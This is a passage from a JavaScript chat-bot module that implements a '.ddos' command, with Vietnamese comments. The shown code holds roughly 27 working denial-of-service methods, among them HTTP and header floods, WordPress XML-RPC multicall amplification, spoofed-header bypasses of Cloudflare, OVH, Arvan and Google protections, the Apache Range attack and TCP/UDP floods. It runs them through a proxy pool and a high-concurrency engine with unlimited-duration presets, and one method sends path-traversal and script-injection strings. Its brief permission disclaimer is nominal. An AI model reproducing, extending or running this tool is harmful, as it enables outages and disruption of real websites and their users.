        return res.status;
    } catch { return null; }
}

/** 12. XMLRPC – WordPress XML-RPC multicall flood (khuếch đại 1 req → nhiều action) */
async function method_xmlrpc(target_url) {
    const base = target_url.replace(/\/$/, "");
    const url  = `${base}/xmlrpc.php`;
    const calls = Array.from({ length: randInt(10, 20) }, () =>
        `<value><struct>` +
        `<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>` +
        `<member><name>params</name><value><array><data>` +
        `<value><string>${randHex(8)}</string></value>` +
        `<value><string>${randHex(8)}</string></value>` +
        `</data></array></value></member>` +
        `</struct></value>`
    ).join("");
    const body =
        `<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>` +
        `<params><param><value><array><data>${calls}</data></array></value></param></params>` +
        `</methodCall>`;
    const headers = buildBaseHeaders({
        "Content-Type"  : "text/xml",
        "Content-Length": String(Buffer.byteLength(body)),
        "X-Forwarded-For": randIp(),
    });
    try {
        const res = await proxyPool.axios({
            method: "POST", url, data: body, headers,
            timeout: 6000, maxRedirects: 1, validateStatus: () => true,
            httpsAgent: new https.Agent({ rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 13. CFB – Cloudflare Bypass nâng cao (fingerprint đầy đủ + challenge simulation) */
async function method_cfb(target_url) {
    const url = `${target_url}${randItem(PATHS_FUZZ)}?__cf_chl_rt_tk=${randHex(32)}&cf_chl=${randHex(16)}`;
    const cfRay   = `${randHex(16)}-SIN`;
    const cfVisit = randHex(32);
    const headers = buildBaseHeaders({
        "X-Forwarded-For" : randIp(),
        "CF-RAY"          : cfRay,
        "CF-Visitor"      : `{"scheme":"https"}`,
        "CF-Connecting-IP": randIp(),
        "CDN-Loop"        : "cloudflare",
        "Cookie"          : `cf_clearance=${cfVisit}; __cf_bm=${randHex(64)}; _cfuvid=${randHex(43)}; __cfruid=${randHex(32)}`,
        "Origin"          : target_url,
        "Sec-Fetch-Site"  : "same-origin",
        "Sec-Fetch-Mode"  : "navigate",
        "Sec-Fetch-Dest"  : "document",
        "Sec-CH-UA-Full-Version": `"124.0.${randInt(1000,9999)}.${randInt(10,99)}"`,
        "Sec-CH-UA-Bitness"     : `"64"`,
        "Sec-CH-UA-Arch"        : `"x86"`,
        "Sec-CH-UA-Model"       : `""`,
        "Sec-CH-UA-WoW64"       : `?0`,
    });
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 6000, maxRedirects: 5, validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: true, rejectUnauthorized: false, minVersion: "TLSv1.3" }),
        });
        return res.status;
    } catch { return null; }
}

/** 14. COOKIE – Cookie jar overflow (nhồi hàng trăm cookie, gây tràn bộ nhớ parser) */
async function method_cookie(target_url) {
    const cookieCount = randInt(100, 300);
    const cookies = Array.from({ length: cookieCount }, () =>
        `${randHex(randInt(4, 12))}=${randHex(randInt(8, 32))}`
    ).join("; ");
    const headers = buildBaseHeaders({
        "Cookie"         : cookies,
        "X-Forwarded-For": randIp(),
    });
    try {
        const res = await proxyPool.axios({
            method: "GET",
            url: `${target_url}${randItem(PATHS_FUZZ)}`,
            headers,
            timeout: 5000, maxRedirects: 2, validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: true, rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 15. APACHE – Range header attack (CVE-2011-3192, ép server phân mảnh response) */
async function method_apache(target_url) {
    const rangeCount = randInt(20, 50);
    const ranges = Array.from({ length: rangeCount }, (_, i) => `${i * 5}-${i * 5 + 4}`).join(",");
    const headers = buildBaseHeaders({
        "Range"          : `bytes=0-,${ranges}`,
        "Request-Range"  : `bytes=0-,${ranges}`,
        "X-Forwarded-For": randIp(),
        "Connection"     : "keep-alive",
    });
    try {
        const res = await proxyPool.axios({
            method: "GET",
            url: `${target_url}${randItem(["/", "/index.html", "/static/main.js", "/assets/bundle.js"])}`,
            headers,
            timeout: 5000, maxRedirects: 0, validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: true, rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 16. DGB – Dynamic GET Bypass (URL trông hợp lệ, path thực tế của site) */
async function method_dgb(target_url) {
    const segments = Array.from({ length: randInt(2, 5) }, () =>
        randItem(["products","category","post","article","user","page","tag","news","about","blog"]) +
        "-" + randHex(6)
    );
    const params = Array.from({ length: randInt(3, 8) }, () =>
        `${randItem(["id","ref","from","source","page","limit","offset","sort","q","lang"])}=${randHex(randInt(4, 12))}`
    ).join("&");
    const url = `${target_url}/${segments.join("/")}?${params}&_=${Date.now()}`;
    const headers = buildBaseHeaders({
        "X-Forwarded-For": randIp(),
        "Accept"         : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    });
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 4000, maxRedirects: 3, validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: false, rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 17. NULL – Null byte / malformed request, qua proxy CONNECT tunnel */
async function method_null(target_url) {
    const parsed = new URL(target_url.startsWith("http") ? target_url : `http://${target_url}`);
    const host   = parsed.hostname;
    const port   = parseInt(parsed.port) || (parsed.protocol === "https:" ? 443 : 80);
    const useSSL = parsed.protocol === "https:";
    const METHODS_LIST = ["GET", "POST", "PUT", "PATCH", "OPTIONS", "PROPFIND", "SEARCH", "DEBUG", "TRACE"];
    const garbage = randItem([
        `\x00\x00\x00`, `%00%00`, `/../../../etc/passwd`,
        `/<script>alert(1)</script>`, `\r\n\r\n`, `%0d%0a%0d%0a`,
        `%2e%2e%2f%2e%2e%2f`, `\x0d\x0a\x0d\x0a`,
    ]);
    const req =
        `${randItem(METHODS_LIST)} ${randItem(PATHS_FUZZ)}${garbage}?t=${Date.now()} HTTP/1.1\r\n` +
        `Host: ${host}\r\n` +
        `User-Agent: ${randItem(USER_AGENTS)}\r\n` +
        `X-Forwarded-For: ${randIpChain(3)}\r\n` +
        `Content-Length: 0\r\n` +
        `Connection: close\r\n\r\n`;
    return new Promise(async resolve => {
        const t = setTimeout(() => resolve(null), 5000);
        try {
            const socket = await getSocket(host, port, useSSL);
            socket.write(req);
            socket.on("data", () => { clearTimeout(t); try { socket.destroy(); } catch {} resolve(200); });
            socket.on("error", () => { clearTimeout(t); resolve(null); });
            socket.on("close", () => { clearTimeout(t); resolve(null); });
        } catch { clearTimeout(t); resolve(null); }
    });
}

/** 18. OVH – OVH hosting bypass (random subdomain + X-OVH-Client + Akamai spoof) */
async function method_ovh(target_url) {
    const parsed   = new URL(target_url.startsWith("http") ? target_url : `https://${target_url}`);
    const randSub  = randHex(6);
    const url      = `${parsed.protocol}//${randSub}.${parsed.host}${randItem(PATHS_FUZZ)}?v=${randHex(6)}&t=${Date.now()}`;
    const headers  = buildBaseHeaders({
        "X-Forwarded-For"  : randIpChain(3),
        "X-OVH-Client"     : randHex(16),
        "X-OVH-MANAGER-ID" : randInt(100000, 999999).toString(),
        "True-Client-IP"   : randIp(),
        "Via"              : `1.1 ${randHex(6)}.akamaiedge.net (Akamai)`,
        "X-Akamai-Config-Log-Detail": "1",
        "X-Check-Cacheable": "YES",
    });
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 5000, maxRedirects: 3, validateStatus: () => true,
            httpsAgent: new https.Agent({ rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 19. GSB – Google Shield Bypass (giả lập Google infrastructure request) */
async function method_gsb(target_url) {
    const url = `${target_url}${randItem(PATHS_FUZZ)}?gclid=${randHex(32)}&utm_source=google&utm_medium=cpc&t=${Date.now()}`;
    const headers = buildBaseHeaders({
        "X-Forwarded-For"   : `${randItem(["66.249.","64.233.","66.102.","74.125.","209.85."])}${randInt(1,254)}.${randInt(1,254)}`,
        "X-Google-Apps-Metadata": `domain=google.com,host=${randHex(8)}.googleusercontent.com`,
        "Via"               : `1.1 google`,
        "X-Cloud-Trace-Context": `${randHex(32)}/${randInt(1e9,9e9)}`,
        "X-Forwarded-Proto" : "https",
        "Referer"           : `https://www.google.com/search?q=${randHex(8)}`,
        "User-Agent"        : "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Accept"            : "text/html,application/xhtml+xml,*/*;q=0.8",
    });
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 5000, maxRedirects: 3, validateStatus: () => true,
            httpsAgent: new https.Agent({ rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 20. AVB – Arvan Cloud Bypass (CDN phổ biến vùng Middle East/CIS) */
async function method_avb(target_url) {
    const url = `${target_url}${randItem(PATHS_FUZZ)}?ar=${randHex(8)}&ts=${Date.now()}`;
    const headers = buildBaseHeaders({
        "X-Forwarded-For"    : randIpChain(2),
        "X-ARN-Client-IP"    : randIp(),
        "X-ARN-Request-ID"   : randHex(32),
        "X-ArvanCloud-CDN"   : "arvancloud.ir",
        "AR-Real-IP"         : randIp(),
        "AR-Connecting-IP"   : randIp(),
        "Via"                : `1.1 arvancloud.ir`,
        "X-ArvanCloud-Secret": randHex(16),
    });
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 5000, maxRedirects: 3, validateStatus: () => true,
            httpsAgent: new https.Agent({ rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 21. STOMP – Bypass Cloudflare captcha endpoint (chk_captcha flood) */
async function method_stomp(target_url) {
    const base = target_url.replace(/\/$/, "");
    const endpoints = [
        "/cdn-cgi/l/chk_captcha",
        "/cdn-cgi/l/chk_jschl",
        "/cdn-cgi/l/email-protection",
        "/cdn-cgi/challenge-platform/h/g/orchestrate/jsch/v1",
    ];
    const url = `${base}${randItem(endpoints)}?ray=${randHex(16)}&s=${randHex(32)}&ts=${Date.now()}`;
    const headers = buildBaseHeaders({
        "X-Forwarded-For"  : randIp(),
        "CF-RAY"           : `${randHex(16)}-SIN`,
        "CF-Connecting-IP" : randIp(),
        "Cookie"           : `cf_clearance=${randHex(64)}; __cf_bm=${randHex(64)}`,
        "Origin"           : target_url,
        "Referer"          : `${target_url}/`,
        "Sec-Fetch-Site"   : "same-origin",
        "Sec-Fetch-Mode"   : "navigate",
    });
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 5000, maxRedirects: 2, validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: true, rejectUnauthorized: false, minVersion: "TLSv1.3" }),
        });
        return res.status;
    } catch { return null; }
}

/** 22. EVEN – Extended/unusual header flood (vượt WAF signature-based filter) */
async function method_even(target_url) {
    const url = `${target_url}${randItem(PATHS_FUZZ)}?q=${randHex(8)}&sid=${randHex(12)}&_=${Date.now()}`;
    const extraHeaders = {};
    const EXTRA_NAMES = [
        "X-Custom-Header","X-Request-Source","X-Powered-By","X-Session-Token",
        "X-Trace-Id","X-Client-Cert","X-Wap-Profile","X-ATT-DeviceId",
        "X-OperaMini-Phone","X-Device-User-Agent","X-Requested-With",
        "X-Do-Not-Track","X-Scheme","X-Auth-Token","X-Nonce",
    ];
    const count = randInt(8, 20);
    for (let i = 0; i < count; i++) {
        extraHeaders[randItem(EXTRA_NAMES) + `-${randHex(3)}`] = randHex(randInt(8, 32));
    }
    extraHeaders["X-Forwarded-For"] = randIpChain(4);
    extraHeaders["Transfer-Encoding"] = randItem(["chunked", "identity"]);
    extraHeaders["TE"] = "Trailers";
    const headers = buildBaseHeaders(extraHeaders);
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 4000, maxRedirects: 2, validateStatus: () => true,
            httpsAgent: new https.Agent({ rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 23. BURST – Bare minimum GET, không header thừa — tối đa RPS */
async function method_burst(target_url) {
    const parsed = new URL(target_url.startsWith("http") ? target_url : `http://${target_url}`);
    const host   = parsed.hostname;
    const port   = parseInt(parsed.port) || (parsed.protocol === "https:" ? 443 : 80);
    const useSSL = parsed.protocol === "https:";
    const BURST_COUNT = randInt(30, 60);
    return new Promise(async resolve => {
        const timeout = setTimeout(() => resolve(200), 8000);
        try {
            const socket = await getSocket(host, port, useSSL);
            let burst = "";
            for (let i = 0; i < BURST_COUNT; i++) {
                burst += `GET /?_=${randHex(4)}${i} HTTP/1.1\r\nHost: ${host}\r\nConnection: keep-alive\r\n\r\n`;
            }
            socket.write(burst);
            socket.on("data", () => { clearTimeout(timeout); socket.destroy(); resolve(200); });
            socket.on("error", () => { clearTimeout(timeout); resolve(null); });
            socket.on("close", () => { clearTimeout(timeout); resolve(null); });
        } catch { clearTimeout(timeout); resolve(null); }
    });
}

/** 24. PIPE – HTTP/1.1 Pipelining: gửi 50 request trên 1 kết nối TCP, không đợi response */
async function method_pipe(target_url) {
    const parsed = new URL(target_url.startsWith("http") ? target_url : `http://${target_url}`);
    const host   = parsed.hostname;
    const port   = parseInt(parsed.port) || (parsed.protocol === "https:" ? 443 : 80);
    const useSSL = parsed.protocol === "https:";
    const PIPE_COUNT = randInt(30, 50);
    return new Promise(async resolve => {
        const timeout = setTimeout(() => resolve(200), 8000);
        try {
            const socket = await getSocket(host, port, useSSL);
            let pipeline = "";
            for (let i = 0; i < PIPE_COUNT; i++) {
                pipeline +=
                    `GET ${randItem(PATHS_FUZZ)}?_=${randHex(8)}&t=${Date.now() + i} HTTP/1.1\r\n` +
                    `Host: ${host}\r\n` +
                    `User-Agent: ${randItem(USER_AGENTS)}\r\n` +
                    `X-Forwarded-For: ${randIp()}\r\n` +
                    `Accept: */*\r\n` +
                    `Connection: keep-alive\r\n\r\n`;
            }
            socket.write(pipeline);
            socket.on("data", () => { clearTimeout(timeout); socket.destroy(); resolve(200); });
            socket.on("error", () => { clearTimeout(timeout); resolve(null); });
            socket.on("close", () => { clearTimeout(timeout); resolve(null); });
        } catch { clearTimeout(timeout); resolve(null); }
    });
}

/** 24. RECYCLE – Reuse keepAlive connection, gửi nhiều request liên tiếp trên 1 socket */
async function method_recycle(target_url) {
    const REUSE_COUNT = randInt(10, 20);
    const agent = new https.Agent({ keepAlive: true, maxSockets: 1, rejectUnauthorized: false });
    const promises = Array.from({ length: REUSE_COUNT }, (_, i) =>
        proxyPool.axios({
            method: "GET",
            url: `${target_url}${randItem(PATHS_FUZZ)}?loop=${i}&_=${randHex(6)}`,
            headers: buildBaseHeaders({ "X-Forwarded-For": randIp() }),
            timeout: 5000,
            maxRedirects: 0,
            validateStatus: () => true,
            httpsAgent: agent,
        }).catch(() => null)
    );
    const results = await Promise.allSettled(promises);
    const ok = results.filter(r => r.status === "fulfilled" && r.value !== null).length;
    return ok > 0 ? 200 : null;
}

/** 25. TCP – TCP connection flood (Layer 4, mở hàng loạt kết nối TCP) */
async function method_tcp(target_url) {
    const parsed = new URL(target_url.startsWith("http") ? target_url : `http://${target_url}`);
    const host   = parsed.hostname;
    const port   = parseInt(parsed.port) || (parsed.protocol === "https:" ? 443 : 80);
    return new Promise(resolve => {
        const sock = net.createConnection({ host, port }, () => {
            sock.write(`GET ${randItem(PATHS_FUZZ)} HTTP/1.1\r\nHost: ${host}\r\nConnection: keep-alive\r\n\r\n`);
            setTimeout(() => { try { sock.destroy(); } catch {} resolve(200); }, randInt(300, 800));
        });
        sock.setTimeout(4000);
        sock.on("error",   () => { try { sock.destroy(); } catch {} resolve(null); });
        sock.on("timeout", () => { try { sock.destroy(); } catch {} resolve(null); });
    });
}

/** 24. UDP – UDP packet flood (Layer 4, gửi gói UDP ngẫu nhiên) */
async function method_udp(target_url) {
    const parsed = new URL(target_url.startsWith("http") ? target_url : `http://${target_url}`);
    const host   = parsed.hostname;
    const port   = parseInt(parsed.port) || 80;
    return new Promise(resolve => {
        const sock = dgram.createSocket("udp4");
        const COUNT = randInt(20, 60);
        let sent = 0;
        const send = () => {
            if (sent >= COUNT) { try { sock.close(); } catch {} return resolve(200); }
            const buf = Buffer.from(randHex(randInt(64, 1024)));
            sock.send(buf, port, host, () => { sent++; send(); });
        };
        sock.on("error", () => { try { sock.close(); } catch {} resolve(null); });
        send();
    });
}

const METHOD_MAP = {
    "1":  { key: "flood",     fn: method_flood,     label: "FLOOD     — Cache-bust GET flood" },
    "2":  { key: "bypass",    fn: method_bypass,    label: "BYPASS    — IP Spoof + Cookie" },
    "3":  { key: "uam",       fn: method_uam,       label: "UAM       — Full Browser Mimicry" },
    "4":  { key: "tls",       fn: method_tls,       label: "TLS       — Handshake Flood" },
    "5":  { key: "https",     fn: method_https,     label: "HTTPS     — HTTPS Flood" },
    "6":  { key: "r2",        fn: method_r2,        label: "R2        — Random Path Flood" },
    "7":  { key: "gyat",      fn: method_gyat,      label: "GYAT      — POST Body Flood" },
    "8":  { key: "slowloris", fn: method_slowloris, label: "SLOWLORIS — Connection Exhaust" },
    "9":  { key: "head",      fn: method_head,      label: "HEAD      — Header Flood" },
    "10": { key: "rudy",      fn: method_rudy,      label: "RUDY      — Slow POST (1 byte/s)" },
    "11": { key: "stress",    fn: method_stress,    label: "STRESS    — Heavy Payload Flood" },
    "12": { key: "xmlrpc",    fn: method_xmlrpc,    label: "XMLRPC    — WP XML-RPC Multicall" },
    "13": { key: "cfb",       fn: method_cfb,       label: "CFB       — Cloudflare Bypass" },
    "14": { key: "cookie",    fn: method_cookie,    label: "COOKIE    — Cookie Jar Overflow" },
    "15": { key: "apache",    fn: method_apache,    label: "APACHE    — Range Header Attack" },
    "16": { key: "dgb",       fn: method_dgb,       label: "DGB       — Dynamic GET Bypass" },
    "17": { key: "null",      fn: method_null,      label: "NULL      — Malformed/Null Byte" },
    "18": { key: "ovh",       fn: method_ovh,       label: "OVH       — OVH Hosting Bypass" },
    "19": { key: "gsb",       fn: method_gsb,       label: "GSB       — Google Shield Bypass" },
    "20": { key: "avb",       fn: method_avb,       label: "AVB       — Arvan Cloud Bypass" },
    "21": { key: "stomp",     fn: method_stomp,     label: "STOMP     — CF Captcha Endpoint" },
    "22": { key: "even",      fn: method_even,      label: "EVEN      — Extended Header Flood" },
    "23": { key: "burst",     fn: method_burst,     label: "BURST     — Bare GET Max RPS" },
    "24": { key: "pipe",      fn: method_pipe,      label: "PIPE      — HTTP/1.1 Pipeline (50 req/conn)" },
    "25": { key: "recycle",   fn: method_recycle,   label: "RECYCLE   — KeepAlive Conn Reuse" },
    "26": { key: "tcp",       fn: method_tcp,       label: "TCP       — L4 TCP Conn Flood" },
    "27": { key: "udp",       fn: method_udp,       label: "UDP       — L4 UDP Packet Flood" },
};

// ── Preset thông minh theo loại server ────────────────────────────────────────
const PRESETS = {
    "cf": {
        label: "PRESET:CF (cfb+stomp+dgb+burst+pipe+recycle)",
        isMix: true,
        pool: ["13","21","16","23","24","25"].map(k => METHOD_MAP[k]),
    },
    "wp": {
        label: "PRESET:WP (xmlrpc+apache+cookie+flood+bypass)",
        isMix: true,
        pool: ["12","15","14","1","2"].map(k => METHOD_MAP[k]),
    },
    "api": {
        label: "PRESET:API (gyat+stress+r2+head+even+burst)",
        isMix: true,
        pool: ["7","11","6","9","22","23"].map(k => METHOD_MAP[k]),
    },
    "slow": {
        label: "PRESET:SLOW (slowloris+rudy+tls+null)",
        isMix: true,
        pool: ["8","10","4","17"].map(k => METHOD_MAP[k]),
    },
    "l4": {
        label: "PRESET:L4 (tcp+udp+tls+burst+pipe)",
        isMix: true,
        pool: ["26","27","4","23","24"].map(k => METHOD_MAP[k]),
    },
    "rage": {
        label: "PRESET:RAGE (tất cả 27 method xoay vòng)",
        isMix: true,
        pool: null, // sẽ dùng ALL_METHODS
    },
};

// Map tên chữ → key số (cho phép .ddos flood / .ddos cfb ...)
const NAME_MAP = Object.fromEntries(
    Object.entries(METHOD_MAP).map(([k, v]) => [v.key, k])
);

const ALL_METHODS = Object.values(METHOD_MAP);

// Giải mã input thành methodInfo (đơn hoặc kết hợp)
function resolveMethod(input) {
    const inp = input.trim().toLowerCase();
    // "0" hoặc "mix" → kết hợp tất cả
    if (inp === "0" || inp === "mix") {
        return {
            key  : "mix",
            label: "MIX ALL (26 phương thức xoay vòng)",
            isMix: true,
            pool : ALL_METHODS,
        };
    }
    // Preset thông minh: cf, wp, api, slow, l4, rage
    if (PRESETS[inp]) {
        const p = PRESETS[inp];
        return { ...p, pool: p.pool ?? ALL_METHODS };
    }
    // Tên chữ đơn: "flood", "cfb", "rudy"...
    if (NAME_MAP[inp]) return METHOD_MAP[NAME_MAP[inp]];

    // "1,3,7" hoặc "1+3+7" → kết hợp tuỳ chọn
    if (/[,+]/.test(input)) {
        const indices = input.split(/[,+]/).map(s => {
            const t = s.trim().toLowerCase();
            return NAME_MAP[t] || t;
        }).filter(Boolean);
        const pool = indices.map(i => METHOD_MAP[i]).filter(Boolean);
        if (pool.length === 0) return null;
        const labels = pool.map(m => m.key.toUpperCase()).join(" + ");
        return { key: "combo", label: `COMBO [${labels}]`, isMix: true, pool };
    }
    // Đơn lẻ theo số
    return METHOD_MAP[input] || null;
}

// ── Engine tấn công — Semaphore Pool (luôn giữ CONCURRENCY req chạy song song) ─
async function run_attack(ctx, target_url, methodInfo, num_requests) {
    const threadId  = ctx.threadId;
    const state     = attack_threads.get(threadId);
    if (!state) return;

    const isInf      = num_requests === Infinity;
    const timeLimit  = isInf ? INF_ATTACK_TIME_MS : MAX_ATTACK_TIME_MS;

    state.requests_sent    = 0;
    state.requests_success = 0; // tổng nhận được response (bao gồm 4xx/5xx)
    state.requests_2xx     = 0; // chỉ đếm 2xx (thật sự hit server thành công)
    state.start_time       = Date.now();
    state.isInf            = isInf;

    const getFn = methodInfo.isMix
        ? () => randItem(methodInfo.pool).fn
        : () => methodInfo.fn;

    // Đào proxy ngay lập tức, không chờ
    autoDigProxy(AUTO_DIG_COUNT);

    let active = 0;
    let done   = false;

    await new Promise(resolve => {
        const pump = () => {
            // Kiểm tra timeout
            if (Date.now() - state.start_time > timeLimit) {
                state.running  = false;
                state.timedOut = true;
            }
            // Bổ sung proxy ngầm khi pool thấp
            if (proxyPool.getStats().total < AUTO_DIG_THRESHOLD && !isAutoDigging) {
                autoDigProxy(AUTO_DIG_COUNT);
            }

            // Lấp đầy slot tới CONCURRENCY
            // Ở chế độ inf: chạy mãi miết cho đến khi state.running = false
            while (active < CONCURRENCY && (isInf || state.requests_sent < num_requests) && state.running) {
                state.requests_sent++;
                active++;
                const fn = getFn();
                fn(target_url).then(status => {
                    active--;
                    if (status !== null) {
                        state.requests_success++;
                        if (status >= 200 && status < 300) state.requests_2xx++;
                    }
                    if (!done) pump();
                }).catch(() => {
                    active--;
                    if (!done) pump();
                });
            }

            // Kết thúc
            if ((!state.running || (!isInf && state.requests_sent >= num_requests)) && active === 0) {
                done = true;
                resolve();
            }
        };
        pump();
    });

    const elapsed = ((Date.now() - state.start_time) / 1000).toFixed(1);
    const rps     = (state.requests_sent / parseFloat(elapsed)).toFixed(1);
    // log.info(`[DDOS] ${methodInfo.label} → ${target_url} — ${state.requests_sent} req / ${state.requests_success} ok / ${elapsed}s`);

    // state.running còn true = hoàn thành bình thường (hết request)
    // state.running = false + timedOut = true → hết giờ
    // state.running = false + timedOut = false → user stop thủ công (không gửi report ở đây)
    const timedOut        = !!state.timedOut;
    const completedNormal = !!state.running && !timedOut;
    const savedUrl        = state.target_url || target_url;
    const savedLabel      = state.methodLabel || methodInfo.label;
    const timeLimitMin    = Math.round(MAX_ATTACK_TIME_MS / 60000);
    const timeLimitLabel  = isInf ? "∞" : `${timeLimitMin} phút`;
    const failed          = state.requests_sent - state.requests_success;
    const rate2xx         = state.requests_sent > 0
        ? ((state.requests_2xx / state.requests_sent) * 100).toFixed(1)
        : "0.0";

    attack_threads.delete(threadId);

    if (completedNormal || timedOut) {
        const header = timedOut
            ? `⏰ Hết giờ — tự dừng sau ${timeLimitLabel}!\n`
            : `✔️ Hoàn thành!\n`;

        await ctx.api.sendMessage({
            msg: header +
                `🎯 Mục tiêu  : ${savedUrl}\n` +
                `⚙️ Phương thức: ${savedLabel}\n` +
                `📤 Đã gửi    : ${state.requests_sent.toLocaleString()} req\n` +
                `✅ Có phản hồi: ${state.requests_success.toLocaleString()} (${state.requests_2xx.toLocaleString()} × 2xx — ${rate2xx}%)\n` +
                `❌ Lỗi/Drop  : ${failed.toLocaleString()}\n` +
                `⚡ Tốc độ    : ~${rps} req/s\n` +
                `⏱️ Thời gian  : ${elapsed}s`
        }, ctx.threadId, ctx.threadType);
    }
}

// ── Kiểm tra admin ───────────────────────────────────────────────────────────
function isAdmin(ctx) {
    return ctx.adminIds.includes(String(ctx.senderId));
}

// ── Export command ───────────────────────────────────────────────────────────
export const commands = {
    ddos: async (ctx) => {
        if (!isAdmin(ctx)) {
            return ctx.api.sendMessage({ msg: "❌ Bạn không phải admin BOT!" }, ctx.threadId, ctx.threadType);
        }

        const args = ctx.args || [];

        if (args.length === 0) {
            return ctx.api.sendMessage({
                msg:
                    `⚡ STRESS TEST — 27 PHƯƠNG THỨC ⚡\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📌 Cú pháp:\n` +
                    `  .ddos <method> <url> [req|inf]\n` +
                    `  .ddos stop | status\n\n` +
                    `── 🔥 PRESET NHANH ───────────────────\n` +
                    `  cf   — Cloudflare (cfb+stomp+burst+pipe)\n` +
                    `  wp   — WordPress (xmlrpc+apache+cookie)\n` +
                    `  api  — REST API  (gyat+stress+burst)\n` +
                    `  slow — Slow kill (slowloris+rudy+tls)\n` +
                    `  l4   — Layer 4  (tcp+udp+burst+pipe)\n` +
                    `  rage — TẤT CẢ 27 method xoay vòng\n\n` +
                    `── [ L7 ] HTTP FLOOD ─────────────────\n` +
                    `  1 flood   2 bypass  3 uam\n` +
                    `  5 https   6 r2      7 gyat\n` +
                    `  9 head   22 even\n\n` +
                    `── [ L7 ] SLOW / CONNECTION ──────────\n` +
                    `  8 slowloris  10 rudy\n\n` +
                    `── [ L7 ] TLS / SOCKET ───────────────\n` +
                    `  4 tls  17 null  23 burst  24 pipe  25 recycle\n\n` +
                    `── [ L7 ] BYPASS / EVASION ───────────\n` +
                    ` 13 cfb   14 cookie  15 apache  16 dgb\n` +
                    ` 18 ovh   19 gsb     20 avb     21 stomp\n\n` +
                    `── [ L7 ] PAYLOAD ────────────────────\n` +
                    ` 11 stress   12 xmlrpc\n\n` +
                    `── [ L4 ] NETWORK ────────────────────\n` +
                    ` 26 tcp   27 udp\n\n` +
                    `── COMBO / KHÔNG GIỚI HẠN ────────────\n` +
                    `  0/mix       — MIX ALL 27 method\n` +
                    `  cfb,burst,udp — Combo tùy chọn\n` +
                    `  inf/forever  — Chạy mãi đến khi stop\n\n` +
                    `💡 Ví dụ:\n` +
                    `  .ddos rage http://x.com inf\n` +
                    `  .ddos cf http://x.com 1000000\n` +
                    `  .ddos cfb,burst,pipe http://x.com\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚡ 2000 req song song | 5M req tối đa\n` +
                    `⏱️ 30 phút (inf = không giới hạn)\n` +
                    `⚠️ Chỉ dùng trên hệ thống bạn có quyền!`
            }, ctx.threadId, ctx.threadType);
        }

        // stop
        if (args[0] === "stop") {
            const state = attack_threads.get(ctx.threadId);
            if (state?.running) {
                state.running = false;
                return ctx.api.sendMessage({
                    msg: `✔️ Đã dừng!\n📤 Đã gửi: ${state.requests_sent} yêu cầu\n✅ Thành công: ${state.requests_success ?? 0}`
                }, ctx.threadId, ctx.threadType);
            }
            return ctx.api.sendMessage({ msg: "❌ Không có tấn công nào đang chạy!" }, ctx.threadId, ctx.threadType);
        }

        // status
        if (args[0] === "status") {
            const state = attack_threads.get(ctx.threadId);
            if (state?.running) {
                const elapsed = ((Date.now() - state.start_time) / 1000).toFixed(1);
                const rps     = (state.requests_sent / parseFloat(elapsed)).toFixed(1);
                return ctx.api.sendMessage({
                    msg: `📊 Đang tấn công:\n` +
                        `🎯 ${state.target_url}\n` +
                        `⚙️ ${state.methodLabel}\n` +
                        `📤 ${state.requests_sent.toLocaleString()}/${state.isInf ? "∞" : state.num_requests.toLocaleString()} req\n` +
                        `✅ Phản hồi : ${state.requests_success.toLocaleString()} | 2xx: ${(state.requests_2xx || 0).toLocaleString()}\n` +
                        `❌ Lỗi/Drop : ${(state.requests_sent - state.requests_success).toLocaleString()}\n` +
                        `⚡ ~${rps} req/s\n` +
                        `⏱️ ${elapsed}s`
                }, ctx.threadId, ctx.threadType);
            }
            return ctx.api.sendMessage({ msg: "📊 Không có tấn công nào đang chạy!" }, ctx.threadId, ctx.threadType);
        }

        if (args.length < 2) {
            return ctx.api.sendMessage({ msg: "❌ Cú pháp: .ddos <method> <url> [số req]\n   Ví dụ: .ddos flood http://example.com\n           .ddos mix http://example.com 50000\n           .ddos cfb,tcp,udp http://example.com" }, ctx.threadId, ctx.threadType);
        }

        const methodInfo = resolveMethod(args[0]);
        if (!methodInfo) {
            return ctx.api.sendMessage({ msg: "❌ Phương thức không hợp lệ!\n   Dùng số 1–24, tên (flood/cfb/tcp...), 0/mix để MIX ALL, hoặc combo: cfb,tcp,udp" }, ctx.threadId, ctx.threadType);
        }

        const target_url   = args[1].startsWith("http") ? args[1] : `http://${args[1]}`;
        const reqArg       = (args[2] || "").toLowerCase();
        const num_requests = (reqArg === "inf" || reqArg === "forever" || reqArg === "0")
            ? Infinity
            : Math.min(parseInt(reqArg) || 50000, 5_000_000);

        if (attack_threads.has(ctx.threadId)) {
            const state = attack_threads.get(ctx.threadId);
            return ctx.api.sendMessage({
                msg: `❌ Đang chạy: ${state.methodLabel} — ${state.requests_sent} req. Dùng .ddos stop trước!`
            }, ctx.threadId, ctx.threadType);
        }

        // Đảm bảo đủ proxy
